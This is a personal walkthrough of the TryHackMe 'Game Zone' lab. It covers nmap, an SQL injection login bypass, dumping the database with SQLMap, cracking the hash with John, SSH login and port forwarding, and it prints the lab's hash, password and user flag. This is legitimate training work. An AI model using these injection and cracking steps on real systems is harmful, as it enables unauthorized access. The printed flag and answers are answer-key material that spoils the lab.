[TryHackMe \| Game Zone](https://tryhackme.com/room/gamezone)

Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

---
Let begin with an Nmap scan to start this penetration test of
```
nmap -p- -T5 ip_address
```

While that runs, i checked the ip address in a browser to see if there is a webserver running, and there is in fact on running on port 80 and i see that there is an ssh on port 22
![[Pasted image 20251020191653.png]]

# Webserver Port 80
![[Pasted image 20251020191719.png]]

Seems to be a game themed webpage of the game Hitman, and the first question asks for the name of the character displayed 

Since i have played this game a lot, i already know the name of this character

***Task 1 Answer: Agent 47***

---
# Understanding SQL

so basically SQL is the language used to communicate to the SQL databases which most of webserver utilized to store their data on.

## Basic SQL Queries
```
SELECT * FROM users WHERE username = :username AND password := password
```

Tryhackme explain that if we input our username and password in the credential field on the website and it utilizes the above SQL query then that itself is a vulnerability which can be exploited

## Exploiting SQL using SQL Injection (Basic)

```sql
' or 1=1 -- - 
```

If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

```sql
SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
```

![[Pasted image 20251020192501.png]]
We gain access and authenticate once we hit enter 
![[Pasted image 20251020192528.png]]

***We get redirected to the portal.php***

---
# Using SQLMap

This is an automatic SQL Injection and Database Takeover tool, it can be downloaded [GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool](https://github.com/sqlmapproject/sqlmap)
and comes preinstall on kali linux

1. We need to point the SQLMap tool to a input field 
2. We need to intercept the request with BurpSuite

![[Pasted image 20251020193317.png]]

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.
![[Pasted image 20251020193413.png]]

- -r uses the intercepted request you saved earlier
- --dbms tells SQLMap what type of database management system it is
- --dump attempts to outputs the entire database

![[Pasted image 20251020193516.png]]

After SQLMAP Finishes 
![[Pasted image 20251020195149.png]]

## In the users table, what is the hashed password?
```
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 
```

## What was the username associated with the hashed password?
```

```

## What was the other table name?
```
post
```

---
# Cracking Password with JohnTheRipper

John is a powerful opensource tool also installed on kali Linux, with the ability to crack hashes, similar to hashcat

```bash
john hash.txt --wordlists=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

![[Pasted image 20251020195754.png]]

The plaintext password is: videogamer124 

---
# Gaining Access via SSH

We now have a username and password, lets try and login to the SSH port service we identified earlier using the below command
```
ssh agent47@ip_address
```

![[Pasted image 20251020200137.png]]

***What is the user flag? 649ac17b1480ac13ef1e4fa579dac95c***

---
# Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

## Using ss to investigate sockets running on a host
We will use a tool called ss to investigate sockets running on a host.

If we run ss -tulpn it will tell us what socket connections are running
```
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q          Local Address:Port                         Peer Address:Port              
udp    UNCONN     0      0                           *:68                                      *:*                  
udp    UNCONN     0      0                           *:10000                                   *:*                  
tcp    LISTEN     0      80                  127.0.0.1:3306                                    *:*                  
tcp    LISTEN     0      128                         *:10000                                   *:*                  
tcp    LISTEN     0      128                         *:22                                      *:*                  
tcp    LISTEN     0      128                        :::80                                     :::*                  
tcp    LISTEN     0      128                        :::22                                     :::*
```

## Viewing a blocked service using port forward
```
ssh -L 10000:localhost:10000 <username>@<ip>
```

We have notice in the IP tables above that the port 1000 is blocked by a firewall, we can then forward this traffic to our server that we own


